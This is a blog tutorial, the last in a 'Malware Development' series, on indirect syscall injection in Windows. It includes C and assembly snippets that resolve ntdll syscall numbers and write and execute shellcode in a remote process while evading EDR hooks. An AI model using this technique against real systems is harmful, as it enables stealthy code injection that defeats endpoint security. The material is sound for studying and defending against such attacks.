---
layout: post
title: "Malware Development Part 5: InDirect Syscall Injection"
date: 2025-08-26
categories: [Malware Development,Red Team,Syscalls,Windows internals,C Programming]
image: https://cdn-images-1.medium.com/v2/resize:fit:800/1*jRbFFS4HqKPeyX2b1t4TNg.png
---

Welcome to the final installment of our malware development series! Over the past articles, we’ve explored a variety of advanced techniques that demonstrate how malware operates in the wild. Each step has built upon foundational knowledge, showcasing increasingly sophisticated methods for evading detection and maintaining stealth.

Here’s a quick recap of what we’ve covered so far:

*   **Shellcode Injection**: Injecting and executing shellcode into target processes, setting the stage for understanding payload execution.
*   **DLL Injection**: Leveraging dynamic link libraries to manipulate or gain control over processes.
*   **NTAPI Injection**: Utilizing Windows NT APIs for stealthy execution, bypassing user-mode hooks.
*   **Direct Syscall Injection**: Making direct system calls to evade user-mode monitoring and hooks in libraries like `ntdll.dll`.

In this final topic, we’re diving into **Indirect Syscall Injection**, which takes the concepts of syscall execution and stealth to the next level. This technique introduces additional obfuscation and indirect execution paths to bypass even the most advanced detection mechanisms, including kernel-level monitoring.

### A Note on System Calls (Syscalls)

Before proceeding, it’s essential to revisit the concept of syscalls, a critical foundation for this discussion. In a previous article, we explained **what a syscall is, how it functions as a bridge between user-mode and kernel-mode operations, and its significance in bypassing hooks**. If you’re new to syscalls or need a refresher, I strongly recommend revisiting that [article](https://medium.com/@mezothekingofgames/malware-development-part-4-direct-syscall-injection-153ed0175f8a). Understanding syscalls is crucial for grasping the importance and sophistication of Indirect Syscall Injection.

### What to Expect

In this article, we will:

1.  Break down how Indirect Syscall Injection works.
2.  Highlight its advantages over other techniques.
3.  Provide practical examples, diagrams, and insights into detection evasion strategies.

This final piece ties together the core lessons from our series, demonstrating how attackers push the limits of stealth and innovation in malware development. Ready to explore? Let’s dive in!

### Disclaimer

The content and all code examples in this article are for research purposes only and must not be used in an unethical context!

**Direct syscalls** are a technique that has become and is still frequently used by attackers and also Red Teamers for various activities such as executing shellcode or creating a memory dump from lsass.exe. However, depending on the EDR, Direct syscalls may no longer be sufficient at this point in time (May 2023) to evade EDRs in the context of various attack phases such as initial access, credential dumping, lateral movement etc. The reason for this is that more and more EDR vendors are implementing mechanisms in their products, such as kernel callbacks, which can be used to determine the memory area from which the syscall statement and the return statement are executed or to which memory area the return statement points. For example, if the return statement is executed outside the memory area of the ntdll.dll, this is abnormal behaviour under Windows and a clear Indicator of Compromise (IOC).

To eliminate this IOC from an attacker’s (red team’s) point of view, or to avoid detection by the EDR, direct syscalls can be replaced by indirect syscalls. In essence, indirect syscalls can be seen as a practical and logical evolution of direct syscalls. Specifically, they allow critical operations such as the syscall statement and the return statement to be executed in the memory of ntdll.dll, rather than in the memory of the .exe being used for execution, as part of an indirect syscall proof of concept (POC). This approach is more in line with standard operating behaviour seen in Windows environments, and is therefore a more sophisticated technique in terms of system compliance.

There are several tools and POCs available to implement and execute direct syscalls, such as [Syswhispers2](https://github.com/jthuraisamy/SysWhispers2), [Syswhispers3](https://github.com/klezVirus/SysWhispers3), [Hells Gate](https://github.com/am0nsec/HellsGate) or [Halo’s Gate](https://blog.sektor7.net/#!res/2021/halosgate.md)

The indirect syscall technique is more or less an evolution of the direct syscall technique. Compared to direct syscalls, indirect syscalls can solve the following EDR evasion problems

*   Firstly, the execution of the syscall command takes place within the memory of the ntdll.dll and is therefore legitimate for the EDR.
*   On the other hand, the execution of the return statement takes place within the memory of the ntdll.dll and points from the memory of the ntdll.dll to the memory of the indirect syscall assembly.

As we will see later, compared to the direct syscall POC, simplified, only a part of the stub from the Native API is implemented and executed directly in the indirect syscall assembly itself, while the syscall statement and return are executed in the ntdll.dll memory. More on this later. The following diagram should help you to understand the concept of indirect syscalls, bearing in mind that it is a simplified representation.

![](https://cdn-images-1.medium.com/max/800/1*eOP0xHexontLyWR6AkyvXA.png)

### Detailed Explanation of the Code

The provided code implements a helper function named `inDirectInjection`, which is designed to extract specific details about a system call function (e.g., its syscall number and address). This function is used in the context of indirect syscall injection, a technique aimed at bypassing API hooks implemented by modern Endpoint Detection and Response (EDR) solutions.

Let’s break it down:

- - -

#### Function Prototype

VOID inDirectInjection(  
	\_In\_ HMODULE hNTDLL,  
	\_In\_ LPCSTR NtFunctionName,  
	\_Out\_ PDWORD NtFunctionSSN,  
	\_Out\_ PUINT\_PTR NtSysCallAddress  
)

*   **Parameters:**

1.  `hNTDLL` (`HMODULE`): Handle to the `ntdll.dll` module in memory. `ntdll.dll` contains low-level Windows system call functions.
2.  `NtFunctionName` (`LPCSTR`): The name of the system function to query (e.g., `"NtOpenProcess"`).
3.  `NtFunctionSSN` (`PDWORD`): A pointer to a variable where the function’s **syscall number** (SSN) will be stored.
4.  `NtSysCallAddress` (`PUINT_PTR`): A pointer to a variable where the **syscall entry address** will be stored.

- - -

#### Key Steps in the Function

1.  **Prepare for the Syscall Opcodes:**

> `_UCHAR SysCallOpcodes[2] = { 0x0F, 0x05 };_`

*   These opcodes (`0x0F 0x05`) represent the `syscall` instruction in x86-64 assembly.
*   They are referenced here for potential validation of the function’s behavior or as a known marker for syscalls.

**Retrieve the Function’s Address:**

> `_FunctionAddress = (UINT_PTR)GetProcAddress(hNTDLL, NtFunctionName); if (FunctionAddress == 0) { printf("[-] Couldn't Get Address ,error: 0x%lx", GetLastError()); return; }_`

*   `**GetProcAddress**` retrieves the memory address of the function (`NtFunctionName`) from the loaded `ntdll.dll` module (`hNTDLL`).

**Extract the Syscall Number:**

> `_*NtFunctionSSN = ((PBYTE)(FunctionAddress + 0x4))[0];_`

*   **Purpose:** This line retrieves the syscall number (SSN) for the targeted function. The SSN is a unique identifier for a system call, used by the kernel to determine which service to execute.
*   **Breakdown:**

1.  `**FunctionAddress + 0x4**`**:** The syscall number is typically stored at a specific offset from the start of the function in `ntdll.dll`. In this case, the offset is `0x4` (4 bytes).
2.  `**(PBYTE)(FunctionAddress + 0x4)**`**:** Casts the calculated address (`FunctionAddress + 0x4`) to a `PBYTE` (pointer to a byte). This allows direct access to the memory at that location.
3.  `**[0]**`**:** Dereferences the pointer to read the byte at the calculated address. This byte contains the syscall number.

#### Why This Works:

*   System call functions in `ntdll.dll` (e.g., `NtOpenProcess`) typically start with a small prologue. After the prologue, the syscall number is stored for internal use when transitioning to kernel mode.

#### Example in Memory:

Suppose `NtOpenProcess` begins at address `0x7FFF0000`. The memory at this location might look like:

0x7FFF0000:   4C 8B D1 B8 23 00 00 00 ...

*   `B8 23 00 00 00`: The `B8` opcode loads the `0x23` value into the `EAX` register. This value (`0x23`) is the syscall number.
*   By adding `0x4` to the base address (`0x7FFF0000 + 0x4`), the function reads the `0x23` value.

**Extract the Syscall Entry Address:**

> `_*NtSysCallAddress = FunctionAddress + 0x12;_`

*   **Purpose:** This line calculates the address of the actual `syscall` instruction within the targeted function. This is used to bypass user-mode hooks and directly invoke the kernel.
*   **Breakdown:**

1.  `**FunctionAddress**`**:** The base address of the function in memory (e.g., `NtOpenProcess`).
2.  `**+ 0x12**`**:** Adds an offset of `0x12` (18 bytes) to the base address. This points to the location of the `syscall` instruction in the function body.

#### Why This Works:

*   In `ntdll.dll`, most syscall functions include:

1.  A **prologue** (e.g., saving registers).
2.  Instructions to load the syscall number.
3.  The `**syscall**` **instruction**, which transitions the execution to kernel mode.

*   The `0x12` offset skips the prologue and points directly to the `syscall` opcode (`0x0F 0x05`).

#### Example in Memory:

Using the same `NtOpenProcess` example:

0x7FFF0000:   4C 8B D1 B8 23 00 00 00 ... 0F 05 C3

*   The `syscall` instruction is at `0x7FFF0012` (18 bytes from the start). The function calculates this address for direct execution.

The provided assembly code is an implementation of a series of **system call stubs**. These stubs allow user-mode programs to invoke kernel-mode functionality by bypassing higher-level APIs. Each procedure corresponds to a specific **Windows NT syscall**, and the implementation leverages the `jmp` instruction to transition directly to the syscall instruction.

Let’s break this down in detail:

- - -

### 1\. Data Section (.data)

extern NTOPENPROCESS\_SSN:DWORD  
extern NTALLOC\_SSN:DWORD  
extern NTWRITE\_SSN:DWORD  
extern NTPROTECT\_SSN:DWORD  
extern NTCREATETHREAD\_SSN:DWORD  
extern NTWAIT\_SSN:DWORD  
extern NTFREE\_SSN:DWORD  
extern NTCLOSE\_SSN:DWORD

extern NT\_SYSCALL:QWORD

#### Explanation:

*   `**extern**` **Variables:**
*   These variables are external symbols, typically defined elsewhere in the program or imported at runtime.
*   Each `*_SSN` variable stores the **syscall number (SSN)** for the corresponding NT function. The SSN uniquely identifies a system call for the Windows kernel.
*   `NT_SYSCALL` is a pointer to the **address of the syscall instruction** (e.g., `0x0F05` for `syscall` on x64).
*   **Purpose:**
*   This section acts as a configuration table, dynamically providing the syscall numbers and addresses for use in the `.code` section.

- - -

### 2\. Code Section (.code)

Each procedure in this section implements a stub for a specific NT function. Let’s look at an example:

- - -

#### NtOpenProcess Stub

NtOpenProcess proc  
		mov r10,rcx  
		mov eax,NTOPENPROCESS\_SSN  
		jmp qword ptr NT\_SYSCALL  
		ret  
NtOpenProcess endp

#### Explanation:

1.  `**mov r10, rcx**`**:**

*   This moves the value of `RCX` (the first argument) into `R10`.
*   On x64 systems, the kernel expects the first parameter in `R10` during a syscall.

`**2. mov eax, NTOPENPROCESS_SSN**`**:**

*   Loads the syscall number for `NtOpenProcess` into the `EAX` register. The kernel uses `EAX` to determine which syscall to invoke.

`**3. jmp qword ptr NT_SYSCALL**`**:**

*   Jumps to the address of the `syscall` instruction (stored in `NT_SYSCALL`). This transfers control to the kernel.

`**4. ret**`**:**

*   Ensures the stack remains clean after returning from the stub.

- - -

#### NtAllocateVirtualMemory Stub

NtAllocateVirtualMemory proc  
		mov r10,rcx  
		mov eax,NTALLOC\_SSN  
		jmp qword ptr NT\_SYSCALL  
		ret  
NtAllocateVirtualMemory endp

#### Explanation:

*   This follows the same structure as `NtOpenProcess` but uses `NTALLOC_SSN` to load the syscall number for `NtAllocateVirtualMemory`.

- - -

### General Observations for All Stubs

*   **Uniform Structure:** Each stub does the same:

1.  Sets up `R10` with the first argument.
2.  Loads the appropriate syscall number into `EAX`.
3.  Jumps to the `syscall` instruction.

*   **Custom Syscall Numbers:** Each stub uses a specific syscall number (via the `*_SSN` variables) for the desired functionality.

- - -

#### I will not go into detail about the structure header file because I have already done so in the [article](https://medium.com/@mezothekingofgames/malware-development-part-4-direct-syscall-injection-153ed0175f8a).

- - -

#### Main.c Code :

This code implements **indirect system call injection** in Windows. The process involves dynamically resolving system call numbers and the address of the syscall instruction from `ntdll.dll`, and then executing system calls to perform tasks such as process handling, memory allocation, and thread creation. Here's a detailed breakdown of the operations:

- - -

### 1\. Loading `ntdll.dll`

hNTDLL = GetModuleHandleW(L"NTDLL");  
if (hNTDLL == NULL) {  
    printf("\[-\] couldn't get a handle to NTDLL Module, error: %lx", GetLastError());  
    return FALSE;  
}

*   `GetModuleHandleW` retrieves a handle to `ntdll.dll`, a key system library that contains low-level NT functions and the `syscall` instructions.

- - -

### 2\. Resolving Syscall Numbers and Address of `syscall`

inDirectInjection(hNTDLL, "NtOpenProcess", &NTOPENPROCESS\_SSN, &NT\_SYSCALL);

*   **Purpose of** `**inDirectInjection**`**:**
*   This function likely retrieves:
*   `**NTOPENPROCESS_SSN**`: The system call number for `NtOpenProcess`.
*   `**NT_SYSCALL**`: The address of the `syscall` instruction in `ntdll.dll`.
*   By resolving these dynamically, the program can invoke NT syscalls directly, bypassing standard Windows API calls that may be hooked by security tools.
*   **Why it’s important:**
*   Dynamic resolution ensures compatibility across different Windows versions, where syscall numbers may vary.
*   It helps evade detection by avoiding high-level API calls.

- - -

### 3\. Opening a Target Process

STATUS = NtOpenProcess(&hProcess, PROCESS\_ALL\_ACCESS, &OA, &CID);

*   Opens a handle to the target process (`hProcess`) with full access (`PROCESS_ALL_ACCESS`).
*   The `OA` (Object Attributes) and `CID` (Client ID) parameters specify the target process.

- - -

### 4\. Allocating Memory in the Target Process

STATUS = NtAllocateVirtualMemory(hProcess, &rbuffer, 0, &shell\_size, MEM\_COMMIT | MEM\_RESERVE, PAGE\_READWRITE);

*   Allocates a memory region (`rbuffer`) in the target process with `PAGE_READWRITE` permissions.
*   `MEM_COMMIT | MEM_RESERVE` ensures that the memory is committed and reserved.
*   The size of the allocated memory is defined by `shell_size`.

- - -

### 5\. Writing Shellcode into the Allocated Memory

STATUS = NtWriteVirtualMemory(hProcess, rbuffer, shell, shell\_size, &BytesWritten);

*   **What it does:**
*   Writes the shellcode (`shell`) into the allocated memory region (`rbuffer`).
*   The amount of data written is stored in `BytesWritten`.

- - -

### 6\. Changing Memory Protection

STATUS = NtProtectVirtualMemory(hProcess, &rbuffer, &shell\_size, PAGE\_EXECUTE\_READ, &oldProtection);

*   **What it does:**
*   Changes the memory protection of the allocated region to `PAGE_EXECUTE_READ`, making the shellcode executable.
*   `oldProtection` stores the previous protection state for cleanup.

- - -

### 7\. Creating a Remote Thread

STATUS = NtCreateThreadEx(&hThread, THREAD\_ALL\_ACCESS, &OA, hProcess, rbuffer, NULL, FALSE, 0, 0, 0, NULL);

*   Creates a remote thread in the target process (`hProcess`), starting execution at the shellcode address (`rbuffer`).

- - -

### 8\. Waiting for the Thread to Finish

STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);

*   Waits for the remote thread to finish execution.

- - -

### 9\. Cleanup

if (rbuffer) NtFreeVirtualMemory(hProcess, &rbuffer, &shell\_size, MEM\_DECOMMIT);  
if (hThread) NtClose(hThread);  
if (hProcess) NtClose(hProcess);

*   Frees allocated memory in the target process.
*   Closes handles to the thread and process to clean up resources.

![](https://cdn-images-1.medium.com/max/800/1*VxdQfy02CcLdBW88L00WzQ.png)

### Full Code Repository

You can find the full code and examples discussed in this article on my **GitHub repository**:

[**GitHub — Moataz51201/InDirect-Syscall: This repository provides an implementation of Indirect…**  
_This repository provides an implementation of Indirect Syscall Injection, an advanced technique for stealthy process…_github.com](https://github.com/Moataz51201/InDirect-Syscall/tree/main "https://github.com/Moataz51201/InDirect-Syscall/tree/main")[](https://github.com/Moataz51201/InDirect-Syscall/tree/main)

As the saying goes, “All good things must come to an end.” Today, I wrap up the **Malware Development Series** — a journey through the intricate world of process injection, syscalls, and evasion techniques. This series has been both a personal challenge and a passion project, aiming to provide insights into the mechanisms often found in advanced persistent threats (APTs) and sophisticated attacks.

- - -

### Reflections

Looking back, this series began with a curiosity to understand malware development from a researcher’s perspective. Each episode — whether it was about Shellcode Injection, DLL Injection, or NTAPI Techniques — was a stepping stone towards mastering these concepts.

Highlights include:

*   **Breaking Down Complex Topics**: Simplifying intricate processes like direct and indirect syscalls for wider comprehension.
*   **Bridging Research and Practice**: Ensuring theoretical concepts were grounded in practical, hands-on examples.
*   **Engaging the Community**: The feedback, questions, and discussions from you, the readers, have been invaluable.

This series wasn’t just about writing code — it was about fostering an understanding of the challenges defenders face, and how attackers attempt to outsmart them.

- - -

### Acknowledgments

I’d like to extend heartfelt thanks to:

*   **Crow**: For being an inspiration and providing detailed tutorials and resources. If you haven’t already, do explore [Crow’s YouTube channel](https://www.youtube.com/@crr0ww) for deeper dives into malware development techniques.
*   **The Cybersecurity Community**: Your engagement, feedback, and curiosity kept me motivated.

#### Resources:

[https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low](https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low)

[https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html](https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html)

[https://alice.climent-pommeret.red/posts/a-syscall-journey-in-the-windows-kernel/](https://alice.climent-pommeret.red/posts/a-syscall-journey-in-the-windows-kernel/)

[https://www.codeproject.com/Articles/1191465/The-Quest-for-the-SSDTs](https://www.codeproject.com/Articles/1191465/The-Quest-for-the-SSDTs) [https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/glimpse-into-ssdt-in-windows-x64-kernel](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/glimpse-into-ssdt-in-windows-x64-kernel)

[https://github.com/am0nsec/HellsGate/blob/master/hells-gate.pdf](https://github.com/am0nsec/HellsGate/blob/master/hells-gate.pdf)

[https://blog.can.ac/2019/10/19/byepg-defeating-patchguard-using-exception-hooking/](https://blog.can.ac/2019/10/19/byepg-defeating-patchguard-using-exception-hooking/)

[https://github.com/everdox/InfinityHook](https://github.com/everdox/InfinityHook)

[https://www.cyberark.com/resources/threat-research-blog/ghosthook-bypassing-patchguard-with-processor-trace-based-hooking](https://www.cyberark.com/resources/threat-research-blog/ghosthook-bypassing-patchguard-with-processor-trace-based-hooking)

By [Moataz Osama](https://medium.com/@mezo512) on [December 31, 2024](https://medium.com/p/aa2398d24882).

[Canonical link](https://medium.com/@mezo512/malware-development-part-5-indirect-syscall-injection-aa2398d24882)

Exported from [Medium](https://medium.com) on August 26, 2025.